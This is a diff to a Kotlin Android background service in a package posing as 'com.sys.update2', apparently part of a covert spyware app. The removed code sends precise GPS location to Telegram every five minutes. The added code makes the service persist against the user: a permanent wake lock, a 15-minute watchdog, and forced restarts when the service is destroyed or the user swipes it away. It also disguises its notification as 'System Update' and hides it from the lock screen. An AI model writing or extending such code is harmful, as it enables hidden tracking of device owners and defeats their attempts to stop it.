@@ -1,7 +1,8 @@
 // language: Kotlin, file: BackgroundService.kt
 // *startForeground() يجب أن يُستدعى خلال 5 ثواني من onStartCommand*
-// *لا تُعد إطلاق الـ service من onDestroy على API 31+ — START_STICKY يكفي*
-// *نوع الـ foregroundServiceType يجب أن يطابق AndroidManifest*
+// *WakeLock يمنع CPU من النوم — ضروري للسحب المستمر*
+// *ServiceWatchdog يعيد الإطلاق كل 15 دقيقة إذا الخدمة اتقتلت*
+// *stopWithTask="false" في Manifest يمنع القتل من الـ recents*
 
 package com.sys.update2
 
@@ -16,6 +17,7 @@ import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
+import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.CoroutineScope
@@ -32,14 +34,15 @@ class BackgroundService : Service() {
     @Volatile private var running = false
     @Volatile private var foregroundStarted = false
 
+    private var wakeLock: PowerManager.WakeLock? = null
+
     private val notificationId = 1001
     private val channelId = "sys_sync_channel"
 
     override fun onCreate() {
         super.onCreate()
 
-        // لا نعمل startForeground هنا — نتركها لـ onStartCommand
-        // لأن onCreate لا يُمنح دائماً الـ 5 ثواني على كل الأجهزة
+        acquireWakeLock()
 
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
         try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
@@ -48,15 +51,17 @@ class BackgroundService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // الضمان الحاسم: startForeground في كل مرة
         if (!foregroundStarted) {
             val ok = tryStartForeground()
             if (!ok) {
-                // لا يمكن العمل كـ foreground — أوقف نفسك بأمان
                 stopSelf()
                 return START_NOT_STICKY
             }
         }
+
+        // تأكد إن الـ watchdog شغال دايماً
+        try { ServiceWatchdog.schedule(applicationContext) } catch (_: Exception) {}
+
         return START_STICKY
     }
 
@@ -69,9 +74,65 @@ class BackgroundService : Service() {
         try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
 
-        // لا نعيد الإطلاق يدوياً — START_STICKY يدير هذا بشكل آمن
+        releaseWakeLock()
+
+        // ⭐ إعادة الإطلاق اليدوي — لأن بعض الأجهزة تتجاهل START_STICKY
+        if (shouldRestart()) {
+            try {
+                val restartIntent = Intent(applicationContext, BackgroundService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    applicationContext.startForegroundService(restartIntent)
+                } else {
+                    applicationContext.startService(restartIntent)
+                }
+            } catch (_: Exception) {}
+        }
 
         super.onDestroy()
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        // المستخدم عمل swipe من الـ recents — نعيد الإطلاق
+        try {
+            val restartIntent = Intent(applicationContext, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                applicationContext.startForegroundService(restartIntent)
+            } else {
+                applicationContext.startService(restartIntent)
+            }
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
+
+    private fun shouldRestart(): Boolean {
+        // لا نعيد الإطلاق لو التطبيق اتقتل بالكامل (force stop)
+        // لكن نعيد لو كان ده مجرد system kill
+        return true
+    }
+
+    // ═══════════════════════════════════════════
+    //  WakeLock
+    // ═══════════════════════════════════════════
+
+    private fun acquireWakeLock() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "sysupdate::SyncWakeLock"
+            )
+            wakeLock?.setReferenceCounted(false)
+            wakeLock?.acquire()
+        } catch (_: Exception) {}
+    }
+
+    private fun releaseWakeLock() {
+        try {
+            wakeLock?.let {
+                if (it.isHeld) it.release()
+            }
+            wakeLock = null
+        } catch (_: Exception) {}
     }
 
     // ═══════════════════════════════════════════
@@ -84,25 +145,15 @@ class BackgroundService : Service() {
             val notif = buildNotification()
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // اختر النوع حسب الأذونات المتاحة فعلاً
-                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                if (hasLocationPermission()) {
-                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                }
-
+                // ⭐ dataSync فقط — مفيش location
                 try {
-                    startForeground(notificationId, notif, type)
+                    startForeground(
+                        notificationId,
+                        notif,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    )
                 } catch (_: Exception) {
-                    // fallback: dataSync فقط
-                    try {
-                        startForeground(
-                            notificationId,
-                            notif,
-                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                        )
-                    } catch (_: Exception) {
-                        startForeground(notificationId, notif)
-                    }
+                    startForeground(notificationId, notif)
                 }
             } else {
                 startForeground(notificationId, notif)
@@ -124,13 +175,12 @@ class BackgroundService : Service() {
 
         val ch = NotificationChannel(
             channelId,
-            " ",
+            "System Update",
             NotificationManager.IMPORTANCE_MIN
         )
         ch.setSound(null, null)
         ch.enableVibration(false)
         ch.setShowBadge(false)
-        ch.description = " "
         ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
         nm.createNotificationChannel(ch)
     }
@@ -138,8 +188,8 @@ class BackgroundService : Service() {
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, channelId)
             .setSmallIcon(R.drawable.ic_white_dot)
-            .setContentTitle(" ")
-            .setContentText(" ")
+            .setContentTitle("System Update")
+            .setContentText("Running")
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
@@ -168,31 +218,6 @@ class BackgroundService : Service() {
             }
         }
 
-        // الموقع — كل 5 دقايق
-        scope.launch {
-            while (running) {
-                try {
-                    if (hasLocationPermission()) {
-                        val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
-                        if (loc != null) {
-                            LocationCache.save(
-                                applicationContext,
-                                loc.latitude,
-                                loc.longitude,
-                                loc.accuracy
-                            )
-                            if (KeyboardBuilder.locationOn) {
-                                TelegramApi.sendMessage(
-                                    "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
-                                )
-                            }
-                        }
-                    }
-                } catch (_: Exception) {}
-                delay(5 * 60_000L)
-            }
-        }
-
         // تنظيف ملفات الكاش
         scope.launch {
             while (running) {
@@ -209,7 +234,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // Watchdog
+        // Watchdog داخلي — كل 60 ثانية يتأكد إن SyncWorker شغال
         scope.launch {
             while (running) {
                 delay(60_000L)
@@ -221,21 +246,17 @@ class BackgroundService : Service() {
                 } catch (_: Exception) {}
             }
         }
-    }
 
-    private fun hasLocationPermission(): Boolean {
-        return try {
-            val fine = ContextCompat.checkSelfPermission(
-                applicationContext,
-                android.Manifest.permission.ACCESS_FINE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-            val coarse = ContextCompat.checkSelfPermission(
-                applicationContext,
-                android.Manifest.permission.ACCESS_COARSE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-            fine || coarse
-        } catch (_: Exception) {
-            false
+        // WakeLock تجديد — كل 5 دقايق
+        scope.launch {
+            while (running) {
+                delay(5 * 60_000L)
+                try {
+                    if (wakeLock?.isHeld != true) {
+                        acquireWakeLock()
+                    }
+                } catch (_: Exception) {}
+            }
         }
     }
 
@@ -248,10 +269,6 @@ class BackgroundService : Service() {
     }
 
     companion object {
-        /**
-         * إطلاق آمن من أي سياق. لا يرمي استثناءات.
-         * يعيد true إذا تم الإطلاق بنجاح.
-         */
         fun startSafely(context: Context): Boolean {
             return try {
                 val intent = Intent(context, BackgroundService::class.java)
